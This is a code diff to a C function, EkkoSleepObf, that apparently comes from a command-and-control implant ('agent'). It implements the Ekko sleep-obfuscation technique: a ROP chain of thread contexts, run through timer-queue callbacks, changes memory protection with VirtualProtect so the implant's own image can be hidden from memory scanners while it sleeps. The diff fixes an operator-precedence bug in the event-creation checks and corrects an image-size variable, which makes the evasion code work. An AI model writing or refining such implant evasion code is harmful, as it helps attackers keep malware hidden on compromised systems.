@@ -15,7 +15,6 @@ BOOL EkkoSleepObf(
     USTRING  Key = { 0 };
     USTRING  Img = { 0 };
     PVOID    ImgBase = { 0 };
-    DWORD    ImgSize = { 0 };
     CONTEXT  TimerCtx = { 0 };
     CONTEXT  ThdCtx = { 0 };
     CONTEXT  Rop[13] = { 0 };
@@ -63,9 +62,11 @@ BOOL EkkoSleepObf(
 
     if (NtStatus == 0)
     {
-        if ((NtStatus = agent->apis->pNtCreateEvent(&EvntTimer, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE) == 0) &&
-            (NtStatus = agent->apis->pNtCreateEvent(&EvntStart, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE) == 0) &&
-            (NtStatus = agent->apis->pNtCreateEvent(&EvntDelay, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE) == 0))
+        if (
+            ((NtStatus = agent->apis->pNtCreateEvent(&EvntTimer, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE)) == 0) &&
+            ((NtStatus = agent->apis->pNtCreateEvent(&EvntStart, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE)) == 0) &&
+            ((NtStatus = agent->apis->pNtCreateEvent(&EvntDelay, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE)) == 0)
+            )
         {
             NtStatus = agent->apis->pRtlCreateTimer(Queue, &Timer, (LPVOID)agent->apis->pRtlCaptureContext, &TimerCtx, Delay += 100, 0, WT_EXECUTEINTIMERTHREAD);
 
@@ -104,7 +105,7 @@ BOOL EkkoSleepObf(
                     /*Virtual protect*/
                     Rop[Inc].Rip = (UINT_PTR)agent->apis->pVirtualProtect;
                     Rop[Inc].Rcx = (UINT_PTR)ImgBase;
-                    Rop[Inc].Rdx = (UINT_PTR)ImgSize;
+                    Rop[Inc].Rdx = (UINT_PTR)ImageSize;
                     Rop[Inc].R8 = (UINT_PTR)PAGE_READWRITE;
                     Rop[Inc].R9 = (UINT_PTR)&Value;
                     Inc++;
